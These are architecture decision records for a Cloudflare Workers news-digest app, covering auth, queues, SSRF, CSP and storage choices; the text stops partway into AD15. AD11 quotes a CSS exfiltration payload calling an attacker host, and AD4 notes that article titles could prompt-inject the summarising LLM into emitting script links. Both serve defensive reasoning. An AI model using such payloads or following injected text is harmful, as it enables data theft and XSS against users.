# Architecture Decision Records

<!-- doc-allow-large: index + full ADR bodies colocated by design; individual ADRs cannot be split without breaking cross-references -->

Decisions made during implementation, with rationale.

**Audience:** Developers

Each ADR documents a non-obvious design choice and the trade-offs considered. Decisions cite related requirements via REQ-X-N format.

---

## Decision Index

| ID | Decision | Category | Date |
|----|----------|----------|------|
| AD1 | Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT, no third-party auth library | Security | 2026-04-22 |
| AD2 | Cloudflare Queues for digest generation under thundering herd | Architecture | 2026-04-22 |
| AD3 | Server-side article-body fetching with SSRF guard | Security | 2026-04-27 |
| AD4 | Plaintext-only LLM output; no markdown parser or HTML sanitizer | Security | 2026-04-22 |
| AD5 | KV for caches, D1 for consistent state | Storage | 2026-04-22 |
| AD6 | Polling instead of SSE or WebSockets for scrape-run progress | UI | 2026-04-22 |
| AD7 | D1 for chunk completion tracking, replacing KV read-modify-write (CF-002) | Storage | 2026-04-27 |
| AD8 | Cookie attributes are the security contract — kept inline in REQ-AUTH-002/003 | Security | 2026-05-03 |
| AD9 | Storage-shape names (D1 columns, KV keys) are the persistence contract — kept inline in REQ-DISC/AUTH/SET | Storage | 2026-05-03 |
| AD10 | Atomic conditional UPDATE as the once-per-run idempotency gate — no `acquireOnceLock` helper | Architecture | 2026-05-03 |
| AD11 | Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes for FLIP + view-transitions are intentional | Security | 2026-05-04 |
| AD12 | Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled | Operations | 2026-05-04 |
| AD13 | No non-essential cookies (analytics gate) | Privacy | 2026-05-04 |
| AD14 | History-page perf-comparability test permanently skipped | Testing | 2026-05-04 |
| AD15 | Test pool exercises worker.ts directly; production runs through Astro-merged entry | Architecture | 2026-05-04 |
| AD16 | Single-writer invariant for KV `sources:{tag}` enforced via centralized helper | Storage | 2026-05-04 |
| AD17 | Reject `dedupe-groups.ts` extraction; finalize within-group dedup is downstream-gated | Architecture | 2026-05-04 |
| AD18 | Reject `deferred-candidates.ts`; chunk-overflow drop path stays log-only until volume justifies persistence | Architecture | 2026-05-04 |
| AD19 | Reject `tag-railing-flip-core.ts`; FLIP measurements are not separable from DOM and are tested via Playwright | Testing | 2026-05-04 |
| AD20 | Window-scoped idempotency token for star-delegation listener (dual-bundle Pattern B) | Architecture | 2026-05-04 |
| AD21 | Drop-cap per-platform fine-tuning deferred; system font metrics are the cross-platform constraint | UI | 2026-05-04 |
| AD22 | SSRF defence relies on Workers network sandbox; static IP allowlist is best-effort only | Security | 2026-05-05 |
| AD23 | Auth-rate-limit fail-closed without WAF backstop | Security | 2026-05-05 |
| AD24 | Single OAUTH_JWT_SECRET for both session signing and CSRF state | Security | 2026-05-05 |
| AD25 | Cloudflare Access JWT signature unverified server-side; trust Access edge *(Superseded by AD29)* | Security | 2026-05-05 |
| AD26 | REQUIREMENTS.md preserved as historical artefact | Documentation | 2026-05-05 |
| AD27 | All KV writers route through `src/lib/kv/<family>.ts` helpers | Storage | 2026-05-05 |
| AD28 | npm audit gating: HIGH advisory, CRITICAL blocking | Operations | 2026-05-05 |
| AD29 | Cloudflare Access is opt-in additive perimeter; ADMIN_EMAIL gates admin alone | Security | 2026-05-05 |
| AD30 | Cloudflare Access (when bound) MUST cover `*.workers.dev` too; not enforced in worker code | Security | 2026-05-05 |
| AD31 | Google News baseline ownership: coordinator owns per-tag GN fan-out; discovery LLM no longer emits GN fallback | Architecture | 2026-05-06 |

---

### AD1: Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT

**Decision:** Implement sign-in from scratch (~250 lines of TypeScript) instead of adopting Better Auth, Auth.js, or Lucia.

**Context:** Sessions need to be stateless, revocable, and tied to an OAuth/OIDC authorization-code flow. The project has no password, no 2FA, no passkeys. The implementation supports multiple providers (GitHub, Google) via a shared provider registry — each provider adds one registry entry and a `fetchProfile` adapter, with no per-provider branching in the auth routes.

**Alternatives considered:**
- Better Auth + D1 adapter — pulls in an ORM-ish abstraction; version churn risk.
- Auth.js — heavier dependency footprint; GitHub provider module adds little value here.
- Lucia — deprecated at the time of decision; would have required migration anyway.

**Rationale:** The codeflare repo has a proven pattern at this exact shape. Writing ~250 lines avoids a dependency with ~50 transitive ones, eliminates ORM coupling, and simplifies deployment. Migration to Better Auth later is a bounded one-day project if scope expands.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation)

---

### AD2: Cloudflare Queues for digest generation

**Decision:** Use Cloudflare Queues to buffer scheduled and manual digest jobs. Cron dispatches; consumer generates.

**Context:** Target scale is 100 users. Worst realistic case: all 100 schedule the same HH:MM and generate at once. Inline cron generation at concurrency 5 × 60 s per digest = 30 minutes, which exceeds the 15-minute cron wall-time.

**Alternatives considered:**
- Inline cron with concurrency cap 20 — fits wall time (7.5 min) but risks OOM (20 × 5 MB = 100 MB of 128 MB limit) and hits Workers AI per-account concurrency limits.
- `ctx.waitUntil` on refresh only — doesn't solve the scheduled-herd problem.
- Durable Object alarms per user — more precision than needed; adds DO complexity.

**Rationale:** Queues give natural per-message isolation (each job in its own isolate, no shared memory), default 10-wide concurrency with built-in backpressure, and 3-retry semantics. Cron stays a tiny dispatcher. This is the primitive Cloudflare built exactly for this shape of problem.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence). Original framing was for the per-user generation pipeline (REQ-GEN-001, REQ-GEN-002, both Deprecated 2026-04-23 in the global-feed rework); the queue mechanism survived the rework intact.

---

### AD3: Server-side article-body fetching with SSRF guard

**Status:** Accepted (2026-04-27, supersedes AD3-original)

**Decision:** When a feed snippet is too thin to ground a useful summary, the chunk consumer fetches the article body directly. Each fetch is SSRF-guarded, time-bounded (8 s), and size-capped (1.5 MB); a failed fetch falls back to the snippet, never blocking a summary.

**Context:** Feed snippets are often too short to summarise faithfully. An SSRF denylist plus strict timeout and size caps reduce server-side fetch risk to negligible. Richer prompt context measurably improved summary quality on short-snippet feeds.

**Alternatives considered:**
- Keep the no-fetch posture and accept thin summaries on short-snippet feeds.
- Use a residential-IP scraping service.

**Rationale:** An SSRF denylist, 8 s timeout, and 1.5 MB size cap bring the risk to negligible. Fan-out is bounded-concurrency at 20 workers. The quality improvement on short-snippet feeds justifies the added complexity.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) AC 8

---

### AD3-original: No server-side article-body fetching

**Status:** Superseded by AD3 on 2026-04-27

**Decision (historical):** Prohibit all server-side article-body fetching. Summaries rely entirely on the feed-provided snippet.

**Context (historical):** Drafted 2026-04-22 to avoid SSRF risk and Cloudflare-range rate-limiting by publishers. Reversed during the global-feed rework when summary quality on short-snippet feeds proved unacceptable and the risk surface was demonstrated to be manageable with explicit denylist + timeout + size cap.

**Why preserved:** Documentation-discipline.md prescribes immutable original ADRs with a separate superseding ADR. This entry is the archived original; AD3 above is the current decision.

---

### AD4: Plaintext-only LLM output

**Decision:** The LLM prompt requires plaintext output (no markdown, no HTML); summaries are stored as JSON arrays of plaintext strings and rendered via `textContent`.

**Context:** LLMs can be prompt-injected via hostile article titles to produce markdown with `javascript:` links or `<script>` tags. A markdown parser + HTML sanitizer pipeline is a non-trivial surface to keep secure across dependency updates.

**Alternatives considered:**
- Store markdown, render client-side with `marked` + DOMPurify.
- Store markdown, render server-side with sanitize-html.

**Rationale:** Plaintext + `textContent` makes XSS impossible by construction. One less dependency, one less configuration surface, zero sanitizer updates to track. Detail paragraphs are stored as a `string[]` and rendered via `textContent`, so the same invariant holds regardless of how many paragraphs the LLM returns. The constraint survived the 2026-04-23 global-feed rework (which retired the per-user generation REQs REQ-GEN-002/006) and now applies via REQ-PIPE-002.

**Related requirements:** [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract), [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view) (original decision applied to REQ-GEN-005, Deprecated 2026-04-23, Replaced By REQ-PIPE-002)

---

### AD5: KV for caches, D1 for consistent state

**Decision:** KV holds discovered sources, headlines, and source-health counters. D1 holds users, digests, articles, and pending_discoveries.

**Context:** KV is eventually consistent (~60 s) and globally edge-replicated; D1 is strongly consistent but single-region. Each has a shape it's optimal for.

**Alternatives considered:**
- Put everything in D1 for strong consistency everywhere.
- Put everything in KV for speed.

**Rationale:** Caches tolerate ~60 s lag and benefit from edge reads. Pending discovery work needs transactional semantics (`SELECT ... LIMIT 3` + `DELETE`) that KV's list/scan can't provide cleanly. Using each primitive for what it's designed for keeps both simpler.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) (original decision applied to REQ-GEN-003, Deprecated 2026-04-23, Replaced By REQ-PIPE-001)

---

### AD6: Polling for scrape-run progress, not SSE or WebSockets

**Decision:** While a scrape run is in progress, the client polls `GET /api/scrape-status` every 5 seconds to drive the "Update in progress" indicator and the Force Refresh progress display on `/settings`.

**Context:** Scrape runs take ~60 s end-to-end. Users mostly see finished articles on their next visit; real-time progress is a quality-of-life indicator for operators watching `/settings` after triggering a force-refresh. The per-user live-generation polling pattern (REQ-READ-004, deprecated 2026-04-23) is no longer applicable — the dashboard always renders from the article pool.

**Alternatives considered:**
- Server-Sent Events streaming phase updates — no clean transport between the Queue consumer and the SSE HTTP handler without adding Durable Objects.
- WebSockets via per-user DO — works for codeflare (terminals), overkill here.

**Rationale:** Polling `GET /api/scrape-status` (one D1 SELECT + one KV get) is negligible overhead at the operator-only volume this endpoint serves. No DO complexity, no WebSocket protocol, no phase-update machinery. The UX difference is imperceptible for a one-shot status flip.

**Related requirements:** [REQ-PIPE-006](../../sdd/generation.md#req-pipe-006-scrape_runs-aggregation-surfaces-stats-history-and-in-flight-progress)

---

### AD7: D1 for chunk completion tracking, replacing KV read-modify-write

**Decision:** Move the "last chunk done" gate from a KV decrement (`scrape_run:{id}:chunks_remaining`) to a D1 `INSERT OR IGNORE` + `SELECT COUNT(*)` pattern on a dedicated `scrape_chunk_completions` table, with a follow-up conditional `UPDATE scrape_runs SET finalize_enqueued = 1 WHERE finalize_enqueued = 0` to gate the finalize handoff.

**Context (CF-002):** The original KV implementation used a read-modify-write decrement: each chunk consumer read the counter, decremented it, and wrote it back. Under Cloudflare Queues' at-least-once delivery, this exposed two races:

1. **Decrement race:** two concurrent last-chunk consumers read the same value before either wrote. Both saw "zero remaining", both enqueued a finalize pass, and both stamped the run as `ready`.
2. **Send-gate race:** even if the count check held, both consumers could call `SCRAPE_FINALIZE.send` before either set the KV gate.

KV's eventual consistency made both races effectively undetectable via testing in non-adversarial conditions.

**Alternatives considered:**
- Durable Object for serialized counter updates — correct, but adds a DO dependency to a pipeline that runs without one today.
- KV with Compare-And-Swap (`getWithMetadata` + `put` with `expirationTtl` as a CAS surrogate) — fragile; KV has no native CAS and the surrogate is not atomic.

**Rationale:** AD5's own principle applies directly: completion counting needs transactional semantics. `INSERT OR IGNORE` into a table keyed by `(scrape_run_id, chunk_index)` is idempotent under redelivery and gives an exact count via `SELECT COUNT(*)` — no race. The finalize-enqueue gate is collapsed into a single atomic `UPDATE … WHERE finalize_enqueued = 0`; D1 returns `meta.changes` for exactly one consumer. The KV counter (`scrape_run:{id}:chunks_remaining`) is retained as a derived mirror for the `/api/scrape-status` progress display but is no longer authoritative. Implements [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract) and [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass) AC 1 and AC 9.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence), [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract), [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)

---

### AD8: Cookie attributes are the security contract

**Status:** Accepted (2026-05-03)

**Overrides:** `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-AUTH-003`

**Decision:** Keep the session-cookie attributes (`__Host-` prefix, `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`) inline in REQ-AUTH-002 AC 1 and REQ-AUTH-003 AC 3. Treat them as part of the security contract, not implementation detail.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists cookie attributes as belonging in `documentation/security.md` and recommends rewriting AC bullets to user-observable consequences (e.g., "JavaScript on the page cannot read the session token"). A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against the two auth REQs.

**Alternatives considered:**
- Rewrite AC 1 to user-observable language and create `documentation/security.md` with the attribute table behind a backlink.
- Add to `sdd/.user-overrides.md` as an opaque skip entry (today's mechanism, but hides the decision from anyone reading the codebase — see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).

**Rationale:**
- The attributes are load-bearing identifiers — security reviewers grep `__Host-`, `HttpOnly`, `SameSite=Lax` directly to verify the contract holds in source, tests, and the rendered Set-Cookie header.
- Translating to user-observable language loses information: the AC then doesn't constrain whether `__Host-` vs `__Secure-` prefix is used, doesn't pin the SameSite policy, doesn't require Path scoping. A future contributor reading the AC would not know the contract still constrains these.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (column name IS the contract because it's the shared identifier across UI, DB, dispatcher).

**Consequences:**
- spec-reviewer skips these two REQs via the `Overrides:` header above.
- Future cookie-policy changes update both the affected REQ AC and this ADR (and the corresponding security tests) in lockstep.
- `documentation/security.md` is not required by this decision — when it is eventually written, it backlinks here, not the other way around.

**Related requirements:** [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD9: Storage-shape names are the persistence contract

**Status:** Accepted (2026-05-03)

**Overrides:** `mechanism-leakage:REQ-DISC-001`, `mechanism-leakage:REQ-DISC-002`, `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-SET-001`, `mechanism-leakage:REQ-SET-005`, `forbidden-content-column-name:REQ-MAIL-001`

**Decision:** Keep D1 column names (`session_version`, `hashtags_json`, `digest_hour`, `email_enabled`, `pending_discoveries`) and KV key shapes (`sources:{tag}`) inline in their respective REQs' acceptance criteria. Treat them as part of the persistence contract surface, not implementation detail. The same reasoning applies to `email_enabled` in REQ-MAIL-001 AC 9 and the domain header on `sdd/email.md` line 3 — the column name IS the contract noun shared between the settings UI toggle, the `users` column, and the dispatcher's SQL predicate, equivalent to the env-var-as-contract pattern allowed by `spec-discipline.md`.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists "database column names" and "internal storage shapes" as belonging in `documentation/architecture.md` schema sections. A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against five REQs across the Discovery, Authentication, and Settings domains.

**Alternatives considered:**
- Rewrite each AC to describe the user-visible behavior abstractly, with a doc-backlink to a schema section in `documentation/architecture.md`.
- Add per-REQ entries to `sdd/.user-overrides.md` as opaque skip rules (today's mechanism, see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).
- Split each REQ into a behavior REQ (in `sdd/`) and a schema doc (in `documentation/`) — substantial AC reshape risk.

**Rationale:**
- These names are the load-bearing identifiers shared across SQL, the Workers runtime, and any future migration tooling. They are how `INSERT OR IGNORE INTO pending_discoveries`, `SELECT session_version FROM users`, and `KV.get('sources:' + tag)` are written in source — and how reviewers grep to verify a behavior holds.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (the column name IS the contract noun shared across UI, DB, dispatcher).
- The mechanism-leakage rule was authored against frontend-heavy projects where storage names are usually behind ORM abstractions. This project is intentionally close-to-the-metal (raw SQL strings, no ORM, KV keys hand-built) — the storage names are *the* user-facing surface for anyone who runs migrations or writes new queries.

**Consequences:**
- spec-reviewer skips these five REQs via the `Overrides:` header above.
- Schema changes update both the affected REQ AC and this ADR (and the corresponding migration files) in lockstep.
- `documentation/architecture.md` references the storage shapes in §4.2 (libraries) and §4.5 (Worker, queue, and migrations); `documentation/configuration.md` documents the KV bindings and naming conventions. This ADR explains why those high-level references coexist with the inline persistence names in the REQs.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-DISC-002](../../sdd/discovery.md#req-disc-002-discovery-progress-visibility), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-SET-001](../../sdd/settings.md#req-set-001-unified-first-run-and-edit-flow), [REQ-SET-005](../../sdd/settings.md#req-set-005-email-notification-preference)

---

### AD10: Atomic conditional UPDATE as the once-per-run idempotency gate

**Status:** Accepted (2026-05-03)

**Decision:** Idempotency for once-per-scrape-run side effects (queue-finalize enqueue, finalize stats fold) is enforced by a single conditional `UPDATE` against a dedicated `scrape_runs` column with a `WHERE col = 0` clause. The caller inspects `meta.changes` to decide whether to proceed (`changes === 1` → won the race) or short-circuit (`changes === 0` → another isolate already won). No separate `acquireOnceLock(...)` helper is introduced.

**Context:** Two existing call sites use this shape today: (a) `scrape-chunk-consumer.ts` flips `finalize_enqueued` 0→1 to gate the `SCRAPE_FINALIZE.send` (REQ-PIPE-008 AC 3); (b) `scrape-finalize-consumer.ts` flips `finalize_recorded` 0→1 inside the same UPDATE that also folds tokens + cost into the run's totals (REQ-PIPE-008 AC 5/AC 7). Code-review on 2026-04-29 (CF-026) flagged the duplicated shape and proposed a generic `acquireOnceLock(db, table, id, column)` helper.

**Alternatives considered:**
- **`acquireOnceLock` helper:** generic boolean-returning wrapper. The chunk-consumer site fits cleanly, but the finalize-consumer site fuses the gate with the per-attempt stats fold inside one atomic statement — extracting a bare "did I win?" helper would force splitting that into a lock + a separate UPDATE, losing the atomicity that protects against a transient mid-statement error leaving the gate flipped without the stats recorded.
- **`scrape_run_locks` keyed table** (one row per `scrape_run_id` × `lock_name`): cleaner if the number of gates grows beyond two. Today's two-site count doesn't justify the migration + new repo layer; revisit when a third gate would land.

**Rationale:**
- The pattern is two lines of SQL plus a meta.changes check. Wrapping it in a function adds an indirection the reader must follow with no ergonomics win on the call sites that exist.
- The composite UPDATE in finalize-consumer is genuinely load-bearing for atomicity — refactoring to "lock then stats" would re-introduce the failure mode that the consolidated atomic UPDATE was specifically designed (in PR #166) to eliminate.
- Source-grep for `WHERE finalize_recorded = 0` and `WHERE finalize_enqueued = 0` is sufficient to find every gate site; the duplication is at the syntactic surface, not at the semantic level.

**Consequences:**
- Both gate sites stay inline. Each is documented in-place with the `meta.changes` semantics and a comment explaining why the WHERE clause carries the gate value.
- The third gate that would warrant the keyed-table refactor is treated as the trigger; this ADR is the artifact future readers find when they look for "why isn't there an `acquireOnceLock` helper?".
- New gate sites SHOULD copy the pattern verbatim and document the meta.changes semantics inline; if a fourth or fifth site lands without the trigger refactor, this ADR is the place to revisit.

**Related requirements:** [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)

---

### AD11: Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes are intentional

**Decision:** Retain `'unsafe-inline'` in the CSP `style-src` directive (`src/middleware/security-headers.ts`). Do not migrate FLIP animations or view-transition-name assignments away from runtime `.style.X` mutations.

**Context:** Two architectural patterns in the codebase write to inline style attributes from JavaScript at runtime:

1. **FLIP chip animations** (`src/lib/tag-railing-flip.ts`) — when the user toggles a hashtag, every chip in the tag strip measures its old and new positions, then writes `chip.style.transform = translate(${dx}px, ${dy}px)` on the inverse step and `chip.style.transform = 'translate(0,0)'` on the play step. The values are computed per-frame from real layout measurements; they cannot be enumerated at build time.

2. **View-transition-name pre-flight** (`src/scripts/page-effects.ts`) — before an SPA navigation, the active card writes `link.style.setProperty('view-transition-name', card-${slug})` so the browser's View Transitions API can pair the source card with the destination article-detail header. The slug is per-article, not per-build.

CSP3 `style-src` enforces the same allowlist on **runtime** style-attribute writes as on inline `<style>` blocks. Removing `'unsafe-inline'` blocks both patterns.

**Alternatives considered:**

- **`'unsafe-hashes'` directive (CSP3)** — allows hash-source to validate inline event handlers and `.style.X` writes. Requires a hash for every possible value. The FLIP transforms have continuous values (`translate(${dx}px, ${dy}px)`); enumeration is impossible. Rejected.

- **CSS custom properties via `setProperty('--var', value)`** — write to `--flip-translate` against a static CSS rule `transform: var(--flip-translate)`. Browser behavior on whether `style-src` enforces against custom-property writes is **inconsistent across engines** (the values are stored as opaque token strings, not parsed CSS at write time). Could work, but relies on a gray-area interpretation; would need cross-browser verification. Rejected as fragile.

- **Web Animations API rewrite** — `chip.animate([...])` runs entirely in JS, never touches the style attribute, CSP-exempt. Would require ~3-5h refactor of `tag-railing-flip.ts` plus a parallel rewrite of view-transition-name to use class toggles with a single fixed name. Working, but the security gain does not justify the regression risk on user-visible animation code that is hard to validate without a browser.

- **Dynamic `<style nonce="...">` injection** — generate a per-request nonce, inject one `<style>` per FLIP frame, append/remove. Massive overhead per animation step; complicates the FLIP loop. Rejected.

- **Migrate CSP entirely to Astro 6 `security.csp`** — Astro 6 emits per-page CSP via `<meta>` tag with auto-generated hashes. Combined with the middleware's response-header CSP, browsers enforce the intersection — and the runtime `.style.X` writes still wouldn't have hashes. Same fundamental blocker. Also blocked separately by the still-pinned `astro@5.18.1` (see `package.json`'s pin commit).

**Rationale:** The actual security cost of `'unsafe-inline'` on `style-src`, given the rest of the policy, is small:

- An XSS attacker who can inject CSS but not JS cannot run code or hijack the session — those vectors are blocked by the strict `script-src 'self'` (no inline scripts allowed).
- The classic CSS exfiltration vector — `body { background: url(http://attacker.com/log?...) }` — requires an outbound network call, which is blocked by `connect-src 'self'` and the narrow `img-src 'self' data: gravatar`.
- Attribute-leak attacks (`::before { content: attr(...) }` + URL load) are likewise blocked by `connect-src`.
- `frame-ancestors 'none'` blocks UI redress / clickjacking via injected styles.

Strict `script-src 'self'` is doing 95% of the XSS-prevention work. The marginal security gain from removing `'unsafe-inline'` on `style-src` does not justify replacing two well-understood, currently-shipping animation patterns with reimplementations on top of less-tested APIs. Many production sites run this exact combination (strict `script-src` + `'unsafe-inline'` style-src) deliberately.

**Consequences:**

- The CSP comment block in `src/middleware/security-headers.ts` documents `'unsafe-inline'` as required, and points at this ADR for the full reasoning.
- A future contributor who proposes removing `'unsafe-inline'` from `style-src` MUST also propose a concrete alternative for the FLIP and view-transition-name mutation patterns. The "just drop it" path will reliably break production (this is the third time it has been attempted on this project — see `hotfix/csp-style-unsafe-inline` history).
- If Astro ever ships native CSP support that handles runtime style mutations (e.g., via per-element nonces resolved at runtime), revisit this decision.
- `tests/e2e/csp-violation.spec.ts` continues to act as the merge gate for any CSP tightening — it subscribes to `securitypolicyviolation` events on a live `/digest` navigation and fails the build if any fire.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-security-headers-on-every-response), [CON-SEC-001](../../sdd/constraints.md#con-sec-001-strict-content-security-policy)

---

### AD12: Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled

**Decision:** Stand up an integration deployment target on a distinct hostname (set per-fork via the `APP_URL` GitHub Environment variable on the `integration` environment) backed by fully isolated Cloudflare resources — D1, KV, queues all suffixed `-integration`. Deploys are manual-only via a dedicated GitHub Actions workflow (`.github/workflows/deploy-integration.yml`) that always pulls the current `develop` HEAD. Cron triggers are disabled on integration; the scrape pipeline runs only when the operator hits `/api/admin/force-refresh`. Worker secrets are sourced from repo-level GitHub Actions secrets via the `environment: integration` fallback.

**Context:** Major dependency bumps (Astro 5→6 was the trigger), schema migrations, CSP tightening, and animation rewrites had no live-edge proving ground before integration existed. The only path to a real-browser test was production, which meant either painful rollbacks (`hotfix/csp-style-unsafe-inline` history) or speculative testing on local dev that didn't catch view-transition / PWA / cron-driven regressions. Vibe-coding without a staging surface was costing rollback time.

**Alternatives considered:**

- **Branch-based auto-deploy** (push to `integration` branch → auto-deploy). Rejected: forces operator to maintain a parallel branch and remember to push it; rebase friction every time develop moves.
- **Same workflow with environment dropdown** (codeflare's pattern: one `deploy.yml`, manual dispatch picks production or integration). Cleaner but requires deeper restructuring (drop `[env.integration]` blocks in wrangler.toml in favour of `--name` CLI overrides + per-env `vars.X`). The two-workflow shape was the lower-risk path to ship integration today; the single-workflow refactor is a good cleanup later.
- **Auto-deploy on every push to develop** (mirror production's gate-on-PR-Checks pattern). Rejected: develop receives many small commits during iteration. Auto-deploys would consume time-to-deploy and the operator would lose the "deliberately staged a coherent change to test" workflow.
- **Shared resources (one D1, one KV) across prod and integration**. Rejected: integration migrations would corrupt prod data; integration force-refresh would compete with prod scrape state.
- **Cron triggers enabled on integration**. Rejected: would consume Workers AI budget on every-four-hour scrape runs that nobody is watching, and integration's empty seed data isn't representative enough to be worth the cost.

**Rationale:** The integration env serves a single purpose: confidence on changes that have non-trivial blast radius if they break in prod. The operator-only manual trigger matches the actual workflow (a person deciding "this is risky, I want to see it live before main"). Resource isolation removes the data-corruption class of failure. Crons-off keeps the cost surface narrow.

**Consequences:**

- 2× Cloudflare resource provisioning. Negligible cost on the small-data tier (D1, KV, queues are pennies/month).
- Operator must remember to manually trigger. There's no automation enforcing "test on integration before merging to main"; that discipline is on the human.
- Per-env GitHub Environment scoping is in place (`environment: integration`) so any secret can later be overridden without touching workflow code (e.g., a separate `OAUTH_JWT_SECRET` to isolate cross-env JWT identity confusion).
- Integration's `APP_URL` is sourced from a GitHub Environment **variable** (`vars.APP_URL` on the `integration` environment), NOT a secret and NOT hardcoded in `wrangler.toml`. The codeflare pattern: variables for non-sensitive per-environment config, secrets for credentials. Any fork sets their own integration hostname under Settings → Environments → integration → Variables → APP_URL without touching code.
- The bootstrap script (`scripts/bootstrap-resources.sh`) accepts an `ENV_NAME` env var to operate on env-scoped sections; placeholder IDs in wrangler.toml (`TBD-bootstrap-on-first-deploy`) trigger create-or-lookup-by-name on the first run.

**Related requirements:** [REQ-OPS-006](../../sdd/observability.md#req-ops-006-integration-deployment-target)

---

### AD13: No non-essential cookies (analytics gate)

**Status:** Accepted (2026-05-04)

**Decision:** The product MUST NOT set non-essential cookies. The only cookies allowed are session-essential ones (auth session token, refresh token, theme preference, OAuth state, CSRF). Adding any analytics, marketing, fingerprinting, A/B-testing, or tracking cookie requires revisiting this ADR and updating the tagline copy.

**Context:** The landing-page tagline at `src/pages/index.astro:54-57` asserts that this product runs without cookie banners ("Where we're going, we don't need cookie banners…"). This is a load-bearing user-trust claim that an unrelated future analytics/marketing PR could silently violate, breaking the tagline contract and potentially creating a compliance liability under EU/Swiss cookie-consent regimes.

**Rationale:** The tagline is not a marketing flourish — it's a stated contract. Reviewing the no-cookies claim during every analytics-curious PR keeps the contract honest. Cookieless analytics options exist (server-side aggregation from Worker request logs, edge-aggregated counters in KV, on-page Web-Vitals reporting via `sendBeacon` without an identifier cookie) and should be preferred when telemetry is genuinely needed.

**Consequences:**
- Reviewing this ADR is a mandatory step on any PR adding `Set-Cookie` for non-auth purposes.
- Telemetry/analytics integrations must use cookieless approaches (aggregated edge logs, one-shot beacon to a first-party endpoint with no client-side identifier, etc.) or this ADR must be superseded with an explicit decision and a tagline-copy revision.
- Until a dedicated `documentation/security.md` is bootstrapped, the essential cookie inventory lives inline in this ADR set (AD8 covers session + refresh-token cookies; OAuth state and theme cookies are documented at their respective issue sites). When `security.md` is eventually written it consolidates and supersedes those scattered entries.

**Related requirements:** none (this is a product-trust contract, not a behavioral REQ).

---

### AD14: History-page perf-comparability test permanently skipped

**Status:** Accepted (2026-05-04)

**Overrides:** `skipped-test:REQ-READ-002`, `skipped-test:REQ-HIST-001`

**Decision:** The numeric perf-comparability test (history back-nav ≤ 1.6× digest back-nav, median of 3 samples) in `tests/e2e/view-transition.spec.ts` is permanently skipped. No expiry, no removal trigger.

**Context:** A perf assertion was added to verify that `/history` back-navigation rendered within 1.6× the time of `/digest` back-navigation. The test reproducibly failed because `/history` is structurally heavier — opened day-groups carry more cards and trigger more layout work than the flat digest list. Multiple attempts to close the gap (lazy-render hidden groups, virtualize the list, defer non-visible card hydration) either regressed visual behavior or didn't move the timing meaningfully. User-confirmed on 2026-04-28: "we leave it as is, enough trying to fix this."

**Rationale:** The structural REQ-READ-002 / REQ-HIST-001 contracts (single-named-group view-transition shaping, return-morph pair forms at `astro:after-swap`) remain covered by the non-skipped tests above the skip in the same file. The numeric perf gap is a property of the feature, not a regression. Keeping a permanently-skipped test costs nothing, and resurrecting it would require a future refactor to claim the gap is closed — at which point the test exists as a guard against re-regression.

**Consequences:**
- spec-reviewer skips the `it.skip` finding for this specific test via the `Overrides:` header above.
- If a future refactor intentionally narrows the perf gap, restore the test and update or remove this ADR.
- The skip line in `tests/e2e/view-transition.spec.ts` references this ADR rather than `sdd/.user-overrides.md` (which is being phased out per codeflare#266).

**Related requirements:** [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view), [REQ-HIST-001](../../sdd/history.md#req-hist-001-day-grouped-article-history)

---

### AD15: Test pool exercises worker.ts directly; production runs through the Astro-merged entry

**Status:** Accepted (2026-05-04)

**Decision:** Vitest's Workers pool loads `src/worker.ts` directly as the test entry. Production loads `dist/_worker.js/_merged.mjs` (the Astro-built bundle) per the `main` field in `wrangler.toml`. The two entry shapes are intentionally NOT unified.

